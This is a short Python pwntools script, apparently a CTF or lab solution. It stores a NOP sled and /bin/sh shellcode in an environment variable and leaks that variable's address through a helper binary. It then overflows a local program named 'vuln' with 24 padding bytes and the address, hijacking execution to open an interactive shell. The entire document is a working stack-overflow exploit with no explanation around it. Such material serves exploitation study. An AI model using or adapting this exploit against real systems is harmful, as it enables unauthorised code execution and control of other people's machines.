from pwn import *

context.arch = 'amd64'
context.os = 'linux'

env_var = asm(shellcraft.nop()) * 16 * 1024 + asm(shellcraft.sh())
p = process(['./getenv', 'SC'], env={'SC': env_var})

resp = p.recvline().decode()
addr = int(resp[resp.find('0x') : -1], 16)
print(resp[resp.find('0x') : -1])

payload = 24 * b'a' + p64(addr).rstrip(b'\x00')
p = process(['./vuln', payload], env={'SC': env_var})

p.interactive()
